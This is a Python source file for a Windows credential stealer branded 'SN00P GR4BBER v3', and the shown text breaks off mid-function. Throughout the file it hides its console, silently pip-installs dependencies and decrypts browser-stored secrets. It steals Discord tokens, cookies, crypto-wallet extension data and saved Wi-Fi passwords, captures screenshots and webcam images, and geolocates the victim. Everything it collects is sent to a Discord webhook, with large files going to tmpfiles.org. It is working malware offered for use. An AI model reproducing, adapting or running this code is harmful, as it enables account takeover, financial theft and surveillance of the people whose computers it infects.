import os
import sys
import re
import json
import base64
import urllib.request
import datetime
import subprocess
from threading import Thread
import logging
import sqlite3
import platform
import psutil
import time
import ctypes
import mimetypes
import uuid
import shutil
import glob
import tempfile
import socket
import zipfile
from concurrent.futures import ThreadPoolExecutor
from Crypto.Cipher import AES
import win32crypt

try:
    from PIL import ImageGrab
except ImportError:
    pass
try:
    import cv2
except ImportError:
    pass
try:
    import pyperclip
except ImportError:
    pass

if sys.argv[0].endswith(".py"):
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO)
Logger = logging.getLogger("TokenGrabber")

def install_import(modules):
    for module, pip_name in modules:
        try:
            if module == "PIL":
                from PIL import ImageGrab
            elif module == "cv2":
                import cv2
            elif module == "Crypto.Cipher.AES":
                from Crypto.Cipher import AES
            elif module == "win32crypt":
                import win32crypt
            elif module == "pyperclip":
                import pyperclip
            else:
                __import__(module)
        except ImportError:
            Logger.info(f"Installing missing module: {pip_name}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                if module == "PIL":
                    from PIL import ImageGrab
                elif module == "cv2":
                    import cv2
                elif module == "Crypto.Cipher.AES":
                    from Crypto.Cipher import AES
                elif module == "win32crypt":
                    import win32crypt
                elif module == "pyperclip":
                    import pyperclip
                else:
                    __import__(module)
            except:
                pass

install_import([
    ("win32crypt", "pypiwin32"),
    ("Crypto.Cipher.AES", "pycryptodome"),
    ("sqlite3", "sqlite3"),
    ("psutil", "psutil"),
    ("PIL", "Pillow"),
    ("cv2", "opencv-python"),
    ("requests", "requests"),
    ("pyperclip", "pyperclip")
])

import requests
import pyperclip
from zipfile import ZipFile

WEBHOOK_URL = ''  # sera injecté par le builder
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
TEMP_DIR = os.getenv("TEMP")
SNOOP_STASH_DIR = os.path.join(TEMP_DIR, "Snoop_V3_Stash")
SNOOP_REPORT_ZIP_BASE = os.path.join(TEMP_DIR, "Snoop_Report_")

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Lightcord': ROAMING + '\\Lightcord',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
    'Iridium': LOCAL + '\\Iridium\\User Data',
    'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles'
}

BROWSER_TARGETS = {
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser',
    'Chrome': LOCAL + '\\Google\\Chrome',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS',
    'Edge': LOCAL + '\\Microsoft\\Edge',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser',
    'Amigo': LOCAL + '\\Amigo',
    'Torch': LOCAL + '\\Torch',
    'Kometa': LOCAL + '\\Kometa',
    'Orbitum': LOCAL + '\\Orbitum',
    'CentBrowser': LOCAL + '\\CentBrowser',
    '7Star': LOCAL + '\\7Star\\7Star',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser',
    'Uran': LOCAL + '\\uCozMedia\\Uran',
    'Iridium': LOCAL + '\\Iridium',
}

# ========== WALLET EXTENSIONS – ULTRA COMPLET ==========
WALLET_EXTENSIONS = {
    "nkbihfbeogaeaoehlefnkodbefgpgknn": "Metamask",
    "ejbalbakoplchlghecdalmeeeajnimhm": "Metamask_alt",
    "fhbohimaelbohpjbbldcngcnapndodjp": "Binance",
    "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
    "fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin",
    "ibnejdfjmmkpcnlpebklmnkoeoihofec": "Tron",
    "ejjladinnckdgjemekebdpeokbikhfci": "Petra",
    "efbglgofoippbgcjepnhiblaibcnclgk": "Martian",
    "phkbamefinggmakgklpkljjmgibohnba": "Pontem",
    "ebfidpplhabeedpnhjnobghokpiioolj": "Fewcha",
    "afbcbjpbpfadlkmhmclhkeeodmamcflc": "Math",
    "aeachknmefphepccionboohckonoeemg": "Coin98",
    "bhghoamapcdpbohphigoooaddinpkbai": "Authenticator",
    "aholpfdialjgjfhomihkjbmgjidlcdno": "ExodusWeb3",
    "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
    "agoakfejjabomempkjlepdflaleeobhb": "Core",
    "mfgccjchihfkkindfppnaooecgfneiii": "Tokenpocket",
    "lgmpcpglpngdoalbgeoldeajfclnhafa": "Safepal",
    "bhhhlbepdkbapadjdnnojkbgioiodbic": "Solfare",
    "jblndlipeogpafnldhgmapagcccfchpi": "Kaikas",
    "kncchdigobghenbbaddojjnnaogfppfj": "iWallet",
    "ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi",
    "hpglfhgfnhbgpjdenjgmdgoeiappafln": "Guarda",
    "cjelfplplebdjjenllpjcblmjkfcffne": "Jaxx Liberty",
    "amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
    "fhilaheimglignddkjgofkcbgekhenbh": "Oxygen",
    "nlbmnnijcnlegkjjpcfjclmcfggfefdm": "MEWCX",
    "nanjmdknhkinifnkgdcggcfnhdaammmj": "Guild",
    "nkddgncdjgjfcddamfgcmfnlhccnimig": "Saturn",
    "aiifbnbfobpmeekipheeijimdpnlpgpp": "TerraStation",
    "fnnegphlobjdpkhecapkijjdkgcjhkib": "HarmonyOutdated",
    "cgeeodpfagjceefieflmdfphplkenlfk": "Ever",
    "pdadjkfkgcafgbceimcpbkalnfnepbnk": "KardiaChain",
    "mgffkfbidihjpoaomajlbgchddlicgpn": "PaliWallet",
    "aodkkagnadcbobfpggfnjeongemjbjca": "BoltX",
    "kpfopkelmapcoipemfendmdcghnegimn": "Liquality",
    "hmeobnfnfcmdkdcmlblgagmfpfboieaf": "XDEFI",
    "lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
    "dngmlblcodfobpdpecaadgfbcggfjfnm": "MaiarDEFI",
    "ookjlbkiijinhpmnjffcofjonbfbgaoc": "TempleTezos",
    "eigblbgjknlfbajkfhopmcojidlgcehm": "XMR_PT"
}

# Desktop wallets
DESKTOP_WALLETS = {
    "Zonas": ROAMING + "\\Zonas",
    "Atomic": ROAMING + "\\atomic\\Local Storage\\leveldb",
    "Exodus": ROAMING + "\\Exodus\\exodus.wallet",
    "Binance": ROAMING + "\\Binance",
    "Coinbase": ROAMING + "\\Coinbase"
}

# ========== HELPER FUNCTIONS ==========
def get_encryption_key(path):
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            return None
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except Exception:
        return None

def decrypt_payload(encrypted_payload, master_key):
    try:
        iv = encrypted_payload[3:15]
        ciphertext = encrypted_payload[15:-16]
        tag = encrypted_payload[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_bytes = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted_bytes.decode('utf-8', errors='ignore')
    except Exception:
        return None

def decrypt_token(encrypted_token, key):
    try:
        encrypted_token = base64.b64decode(encrypted_token.split("dQw4w9WgXcQ:")[1])
        iv = encrypted_token[3:15]
        ciphertext = encrypted_token[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
        return decrypted.decode(errors="ignore").strip()
    except Exception:
        return None

def safe_storage_steal(path, platform_name):
    tokens = []
    key = get_encryption_key(os.path.dirname(path) if any(x in platform_name for x in ["Brave", "Chrome", "Edge", "Opera", "Vivaldi", "Yandex", "Amigo", "Torch", "Kometa", "Orbitum", "CentBrowser", "7Star", "Sputnik", "Epic Privacy Browser", "Uran", "Iridium"]) else path)
    if not key and any(x in platform_name for x in ["Brave", "Chrome", "Edge", "Opera", "Vivaldi", "Yandex", "Amigo", "Torch", "Kometa", "Orbitum", "CentBrowser", "7Star", "Sputnik", "Epic Privacy Browser", "Uran", "Iridium"]):
        return tokens
    leveldb_paths = []
    for root, dirs, _ in os.walk(path):
        if "leveldb" in dirs:
            leveldb_paths.append(os.path.join(root, "leveldb"))
    if not leveldb_paths:
        return tokens
    for leveldb_path in leveldb_paths:
        try:
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith((".log", ".ldb")):
                    continue
                file_path = os.path.join(leveldb_path, file_name)
                with open(file_path, errors="ignore") as f:
                    lines = f.readlines()
                for line in lines:
                    if line.strip():
                        matches = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line)
                        for match in matches:
                            match = match.rstrip("\\")
                            decrypted = decrypt_token(match, key) if key else None
                            if decrypted and (decrypted, platform_name) not in tokens:
                                tokens.append((decrypted, platform_name))
        except Exception:
            pass
    return tokens

def simple_steal(path, platform_name):
    tokens = []
    leveldb_paths = []
    for root, dirs, _ in os.walk(path):
        if "leveldb" in dirs:
            leveldb_paths.append(os.path.join(root, "leveldb"))
    if not leveldb_paths:
        return tokens
    for leveldb_path in leveldb_paths:
        try:
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith((".log", ".ldb")):
                    continue
                file_path = os.path.join(leveldb_path, file_name)
                with open(file_path, errors="ignore") as f:
                    lines = f.readlines()
                for line in lines:
                    if line.strip():
                        matches = re.findall(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", line)
                        for match in matches:
                            match = match.rstrip("\\").strip()
                            if (match, platform_name) not in tokens:
                                tokens.append((match, platform_name))
        except Exception:
            pass
    return tokens

def firefox_steal(path, platform_name):
    tokens = []
    sqlite_paths = []
    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(".sqlite"):
                sqlite_paths.append(os.path.join(root, file))
    if not sqlite_paths:
        return tokens
    for sqlite_path in sqlite_paths:
        try:
            with open(sqlite_path, errors="ignore") as f:
                lines = f.readlines()
            for line in lines:
                if line.strip():
                    matches = re.findall(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", line)
                    for match in matches:
                        match = match.rstrip("\\").strip()
                        if (match, platform_name) not in tokens:
                            tokens.append((match, platform_name))
        except Exception:
            pass
    return tokens

def steal_cookies(path, platform_name):
    tokens = []
    cookie_path = os.path.join(path, "Network", "Cookies")
    if not os.path.exists(cookie_path):
        return tokens
    try:
        if not os.access(cookie_path, os.R_OK):
            return tokens
        conn = sqlite3.connect(f"file:{cookie_path}?mode=ro", uri=True)
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%' AND name = 'token'")
        key = get_encryption_key(os.path.dirname(path))
        for row in cursor.fetchall():
            encrypted_value = row[0]
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                decrypted = decrypted.strip()
                if decrypted and re.match(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", decrypted) and (decrypted, platform_name) not in tokens:
                    tokens.append((decrypted, platform_name))
            except Exception:
                pass
        conn.close()
    except Exception:
        pass
    return tokens

def get_tokens(platform_name, path):
    tokens = []
    if not os.path.exists(path):
        return tokens
    if "Firefox" in platform_name:
        tokens.extend(firefox_steal(path, platform_name) or [])
    else:
        if any(x in platform_name for x in ["Brave", "Chrome", "Edge", "Opera", "Vivaldi", "Yandex", "Amigo", "Torch", "Kometa", "Orbitum", "CentBrowser", "7Star", "Sputnik", "Epic Privacy Browser", "Uran", "Iridium"]):
            profiles = ['Default'] + [f"Profile {i}" for i in range(1, 10)]
            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if os.path.exists(profile_path):
                    tokens.extend(safe_storage_steal(profile_path, f"{platform_name} ({profile})") or [])
                    tokens.extend(simple_steal(profile_path, f"{platform_name} ({profile})") or [])
                    tokens.extend(steal_cookies(profile_path, f"{platform_name} ({profile})") or [])
        else:
            tokens.extend(safe_storage_steal(path, platform_name) or [])
            tokens.extend(simple_steal(path, platform_name) or [])
    return tokens

def get_headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers["Authorization"] = token
    return headers

def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "Unknown"

def send_to_webhook(embeds):
    try:
        payload = {
            "username": "SN00P GR4BBER",
            "avatar_url": "https://w0.peakpx.com/wallpaper/981/593/HD-wallpaper-hacker-dark-mask-thumbnail.jpg",
            "content": "@everyone",
            "embeds": embeds
        }
        data = json.dumps(payload, ensure_ascii=False).encode('utf-8')
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=get_headers(), method="POST")
        with urllib.request.urlopen(req) as response:
            Logger.info(f"Webhook (embeds) sent successfully, status: {response.status}")
        time.sleep(1)
    except Exception as e:
        Logger.error(f"Failed to send webhook (embeds): {e}")

def upload_to_tmpfiles(file_path):
    try:
        with open(file_path, 'rb') as f:
            resp = requests.post("https://tmpfiles.org/api/v1/upload", files={"file": f}, timeout=30)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                url = data["data"]["url"].replace("tmpfiles.org/", "tmpfiles.org/dl/")
                return url
    except Exception:
        pass
    return None

def send_file_to_webhook(file_path, ip_address, content_msg="File from grabber"):
    if not os.path.exists(file_path):
        return
    if os.path.getsize(file_path) > 8 * 1024 * 1024:
        url = upload_to_tmpfiles(file_path)
        if url:
            payload = {"content": f"[{ip_address}] 📦 Fichier volumineux téléchargeable ici : {url}"}
            try:
                req = urllib.request.Request(WEBHOOK_URL, data=json.dumps(payload).encode('utf-8'), headers=get_headers(), method="POST")
                with urllib.request.urlopen(req) as response:
                    Logger.info(f"Large file link sent, status: {response.status}")
            except:
                pass
            return
        else:
            payload = {"content": f"[{ip_address}] ⚠️ Échec de l'upload du fichier (trop gros)."}
            try:
                req = urllib.request.Request(WEBHOOK_URL, data=json.dumps(payload).encode('utf-8'), headers=get_headers(), method="POST")
                with urllib.request.urlopen(req) as response:
                    Logger.info(f"Large file upload failed, status: {response.status}")
            except:
                pass
            return
    boundary = '----WebKitFormBoundary' + uuid.uuid4().hex
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    payload_json_data = {
        'content': f"[{ip_address}] {content_msg}",
        'username': 'SN00P GR4BBER',
        'avatar_url': 'https://w0.peakpx.com/wallpaper/981/593/HD-wallpaper-hacker-dark-mask-thumbnail.jpg'
    }
    body = []
    body.append(f'--{boundary}')
    body.append('Content-Disposition: form-data; name="payload_json"')
    body.append('Content-Type: application/json')
    body.append('')
    body.append(json.dumps(payload_json_data, ensure_ascii=False))
    filename = os.path.basename(file_path)
    mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
    body.append(f'--{boundary}')
    body.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"')
    body.append(f'Content-Type: {mimetype}')
    body.append('')
    with open(file_path, 'rb') as f:
        body.append(f.read())
    body.append(f'--{boundary}--')
    encoded_body = b'\r\n'.join([
        (p if isinstance(p, bytes) else p.encode('utf-8')) for p in body
    ])
    try:
        req = urllib.request.Request(WEBHOOK_URL, data=encoded_body, headers=headers, method="POST")
        with urllib.request.urlopen(req) as response:
            Logger.info(f"File webhook for '{filename}' sent successfully, status: {response.status}")
        time.sleep(1)
    except Exception as e:
        Logger.error(f"Failed to send file webhook for '{filename}': {e}")

# ========== SCREENSHOT & WEBCAM ==========
def capture_screenshot():
    temp_file_path = os.path.join(TEMP_DIR, f"screenshot_{int(time.time())}.png")
    try:
        try:
            from PIL import ImageGrab
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "Pillow", "-q"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        screenshot.save(temp_file_path)
        return temp_file_path
    except Exception:
        return None

def capture_webcam():
    temp_file_path = os.path.join(TEMP_DIR, f"webcam_{int(time.time())}.png")
    try:
        try:
            import cv2
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "opencv-python", "-q"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        time.sleep(0.5)
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite(temp_file_path, frame)
            return temp_file_path
    except Exception:
        pass
    return None

def cleanup_temp_files(*file_paths):
    for path in file_paths:
        if path and os.path.exists(path):
            try:
                os.remove(path)
            except:
                pass

def _run_powershell_command(command, default_value="Unknown"):
    try:
        result = subprocess.check_output(["powershell", "-Command", command], shell=True, creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.DEVNULL, encoding='utf-8', errors='ignore').strip()
        if "Win32_Processor" in command:
            lines = [line.strip() for line in result.split('\n') if line.strip()]
            return lines[0] if lines else default_value
        elif "Win32_VideoController" in command:
            lines = [line.strip() for line in result.split('\n') if line.strip()]
            valid_gpus = [g for g in lines if g and "microsoft" not in g.lower() and "basic render" not in g.lower()]
            return ", ".join(sorted(list(set(valid_gpus)))) if valid_gpus else default_value
        elif "Win32_ComputerSystemProduct).UUID" in command:
            uuid_match = re.search(r'([A-Fa-f0-9]{8}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{12})', result, re.IGNORECASE)
            return uuid_match.group(0) if uuid_match else default_value
        return result if result else default_value
    except Exception:
        return default_value

def create_token_embed(token, user_data, platform_name):
    username = user_data.get('username', 'Unknown')
    discriminator = user_data.get('discriminator', '0')
    if not username or not isinstance(username, str):
        username = "Unknown"
    if not discriminator or not isinstance(discriminator, str):
        discriminator = "0"
    badges = ""
    flags = user_data.get('flags', 0)
    if flags & 64: badges += "🛡️ "
    if flags & 128: badges += "💡 "
    if flags & 256: badges += "⚖️ "
    embed = {
        "title": f"💀 **DISCORD EXPLOIT: {username}#{discriminator}**",
        "description": "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "color": 0x2b2d31,
        "thumbnail": {
            "url": f"https://cdn.discordapp.com/avatars/{user_data.get('id', '0')}/{user_data.get('avatar', '')}.png" if user_data.get('avatar') else ""
        },
        "fields": [
            {"name": "🆔 User ID", "value": f"```{user_data.get('id', 'Unknown')}```", "inline": True},
            {"name": "📧 Email", "value": f"```{user_data.get('email', 'Unknown')}```", "inline": True},
            {"name": "📞 Phone", "value": f"```{str(user_data.get('phone', 'Unknown'))}```", "inline": True},
            {"name": "🚩 Flags", "value": f"```{str(flags)}```", "inline": True},
            {"name": "🏅 Badges", "value": f"```{badges.strip() or 'None'}```", "inline": True},
            {"name": "💻 Platform", "value": f"```{platform_name}```", "inline": True},
            {"name": "🔑 Token", "value": f"```{token}```", "inline": False}
        ],
        "footer": {
            "text": "SN00P GR4BBER v3 | " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
            "icon_url": "https://w0.peakpx.com/wallpaper/981/593/HD-wallpaper-hacker-dark-mask-thumbnail.jpg"
        },
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
    }
    return embed

def get_wifi_info():
    wifi_info = {"current_network": {"SSID": "Unknown", "BSSID": "Unknown", "Signal": "Unknown", "Authentication": "Unknown"}, "saved_networks": []}
    try:
        interfaces_output = subprocess.check_output("netsh wlan show interfaces", shell=True, creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.DEVNULL, encoding='utf-8', errors='ignore')
        current_ssid_match = re.search(r"SSID\s*:\s*(.*)", interfaces_output)
        current_bssid_match = re.search(r"BSSID\s*:\s*(.*)", interfaces_output)
        current_signal_match = re.search(r"Signal\s*:\s*(\d+)%", interfaces_output)
        current_auth_match = re.search(r"Authentication\s*:\s*(.*)", interfaces_output)
        current_network_details = {
            "SSID": current_ssid_match.group(1).strip() if current_ssid_match else "N/A",
            "BSSID": current_bssid_match.group(1).strip() if current_bssid_match else "N/A",
            "Signal": current_signal_match.group(1).strip() + "%" if current_signal_match else "N/A",
            "Authentication": current_auth_match.group(1).strip() if current_auth_match else "N/A"
        }
        wifi_info["current_network"] = current_network_details
        profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True, creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.DEVNULL, encoding='utf-8', errors='ignore')
        profile_names = re.findall(r"All User Profile\s*:\s*(.*)", profiles_output)
        for profile_name in profile_names:
            profile_name = profile_name.strip()
            profile_details = {"SSID": profile_name, "Key": "N/A"}
            try:
                key_output = subprocess.check_output(f'netsh wlan show profile name="{profile_name}" key=clear', shell=True, creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.DEVNULL, encoding='utf-8', errors='ignore')
                key_match = re.search(r"Key Content\s*:\s*(.*)", key_output)
                if key_match:
                    profile_details["Key"] = key_match.group(1).strip()
            except Exception:
                pass
            wifi_info["saved_networks"].append(profile_details)
    except Exception:
        pass
    return wifi_info

def get_system_info(ip_address, wifi_data):
    system_info = {}
    try:
        os_name = platform.system()
        os_release = platform.release()
        os_version = platform.version()
        os_arch = platform.machine()
        system_info['OS'] = f"{os_name} {os_release} (Build {os_version}) {os_arch}"
    except Exception:
        system_info['OS'] = "Unknown"
    try:
        system_info['PC Name'] = platform.node()
    except:
        system_info['PC Name'] = "Unknown"
    try:
        cpu_name_ps = _run_powershell_command("(Get-CimInstance Win32_Processor).Name")
        physical_cores = psutil.cpu_count(logical=False)
        logical_cores = psutil.cpu_count(logical=True)
        system_info['CPU Info'] = f"{cpu_name_ps} (Physical Cores: {physical_cores}, Logical Threads: {logical_cores})"
    except:
        system_info['CPU Info'] = "Unknown"
    try:
        ram = psutil.virtual_memory()
        system_info['Total RAM'] = f"{ram.total / (1024**3):.2f} GB"
        system_info['Used RAM'] = f"{ram.used / (1024**3):.2f} GB ({ram.percent:.2f}%)"
    except:
        system_info['Total RAM'] = "Unknown"
        system_info['Used RAM'] = "Unknown"
    system_info['GPU Model'] = _run_powershell_command("Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name")
    system_info['HWID'] = _run_powershell_command("(Get-CimInstance Win32_ComputerSystemProduct).UUID")
    network_info = {'City': 'Unknown', 'Country': 'Unknown', 'ISP': 'Unknown', 'Proxy/VPN': 'Unknown'}
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,proxy,hosting") as response:
            ip_api_data = json.loads(response.read().decode())
            network_info['City'] = ip_api_data.get('city', 'Unknown')
            network_info['Country'] = ip_api_data.get('country', 'Unknown')
            network_info['ISP'] = ip_api_data.get('isp', 'Unknown')
            is_proxy_vpn = "Yes" if ip_api_data.get('proxy') or ip_api_data.get('hosting') else "No"
            network_info['Proxy/VPN'] = is_proxy_vpn
    except:
        pass
    system_info['Network Info'] = network_info
    system_info['WiFi Info'] = wifi_data
    return system_info

def create_system_embed(system_info, ip_address):
    embed = {
        "title": "💻 **SYSTEM INFORMATION**",
        "description": "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "color": 0x2b2d31,
        "fields": [
            {"name": "🖥️ PC Name", "value": f"```{system_info.get('PC Name', 'Unknown')}```", "inline": True},
            {"name": "🆔 HWID (UUID)", "value": f"```{system_info.get('HWID', 'Unknown')}```", "inline": True},
            {"name": "🌐 OS", "value": f"```{system_info.get('OS', 'Unknown')}```", "inline": False},
            {"name": "🧠 CPU", "value": f"```{system_info.get('CPU Info', 'Unknown')}```", "inline": False},
            {"name": "💡 GPU", "value": f"```{system_info.get('GPU Model', 'Unknown')}```", "inline": False},
            {"name": "💾 RAM", "value": f"```Total: {system_info.get('Total RAM', 'Unknown')} | Used: {system_info.get('Used RAM', 'Unknown')}```", "inline": False},
            {"name": "🌍 **NETWORK & LOCATION**", "value": "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", "inline": False},
            {"name": "📍 IP Address", "value": f"```{ip_address}```", "inline": True},
            {"name": "🏙️ City", "value": f"```{system_info['Network Info'].get('City', 'Unknown')}```", "inline": True},
            {"name": "🗺️ Country", "value": f"```{system_info['Network Info'].get('Country', 'Unknown')}```", "inline": True},
            {"name": "📡 ISP", "value": f"```{system_info['Network Info'].get('ISP', 'Unknown')}```", "inline": True},
            {"name": "🕵️ Proxy/VPN", "value": f"```{system_info['Network Info'].get('Proxy/VPN', 'Unknown')}```", "inline": True},
            {"name": "📶 **WIFI INFORMATION**", "value": "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", "inline": False},
            {"name": "Current SSID", "value": f"```{system_info['WiFi Info']['current_network'].get('SSID', 'Unknown')}```", "inline": True},
            {"name": "Current BSSID", "value": f"```{system_info['WiFi Info']['current_network'].get('BSSID', 'Unknown')}```", "inline": True},
            {"name": "Current Signal", "value": f"```{system_info['WiFi Info']['current_network'].get('Signal', 'Unknown')}```", "inline": True},
            {"name": "Current Auth", "value": f"```{system_info['WiFi Info']['current_network'].get('Authentication', 'Unknown')}```", "inline": True},
        ],
        "footer": {
            "text": "SN00P GR4BBER v3 | " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
            "icon_url": "https://w0.peakpx.com/wallpaper/981/593/HD-wallpaper-hacker-dark-mask-thumbnail.jpg"
        },
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
    }
    return embed

# ========== WALLET STEALING ==========
def steal_wallet_extensions(profile_path, stash_base):
    ext_path = os.path.join(profile_path, "Local Extension Settings")
    if not os.path.exists(ext_path):
        return 0
    found = 0
    for ext_id, name in WALLET_EXTENSIONS.items():
        src = os.path.join(ext_path, ext_id)
        if os.path.exists(src):
            dst = os.path.join(stash_base, "Wallets", name)
            os.makedirs(dst, exist_ok=True)
            shutil.copytree(src, dst, dirs_exist_ok=True)
            found += 1
    return found

def steal_desktop_wallets(stash_base):
    found = 0
    for name, path in DESKTOP_WALLETS.items():
        if os.path.exists(path):
            dst = os.path.join(stash_base, "Wallets", "Desktop", name)
            os.makedirs(dst, exist_ok=True)
            try:
                if os.path.isfile(path):
                    shutil.copy2(path, dst)
                else:
                    shutil.copytree(path, dst, dirs_exist_ok=True)
                found += 1
            except:
                pass
    return found

# ========== BROWSER DATA EXTRACTION ==========
def extract_browser_data(browser_name, base_browser_path, stash_base_path):
    browser_stash_path = os.path.join(stash_base_path, "Browsers", browser_name)
    os.makedirs(browser_stash_path, exist_ok=True)
    profile_dirs = ['Default'] + [f"Profile {i}" for i in range(1, 10)]
    user_data_path = base_browser_path
    if browser_name in ['Brave', 'Chrome', 'Chrome SxS', 'Edge', 'Vivaldi', 'Yandex', 'Amigo', 'Torch', 'Kometa', 'Orbitum', 'CentBrowser', '7Star', 'Sputnik', 'Epic Privacy Browser', 'Uran', 'Iridium']:
        user_data_path = os.path.join(base_browser_path, 'User Data')
    if not os.path.exists(user_data_path):
        return
    master_key = get_encryption_key(user_data_path)
    for profile_name in profile_dirs:
        profile_path = os.path.join(user_data_path, profile_name)
        if not os.path.exists(profile_path):
            continue
        profile_output_dir = os.path.join(browser_stash_path, profile_name)
        os.makedirs(profile_output_dir, exist_ok=True)
        login_data_path = os.path.join(profile_path, "Login Data")
        cookies_path = os.path.join(profile_path, "Cookies")
        history_path = os.path.join(profile_path, "History")
        web_data_path = os.path.join(profile_path, "Web Data")
        db_files = {
            "Login Data": login_data_path,
            "Cookies": cookies_path,
            "History": history_path,
            "Web Data": web_data_path
        }
        temp_db_files = {}
        for db_name, original_path in db_files.items():
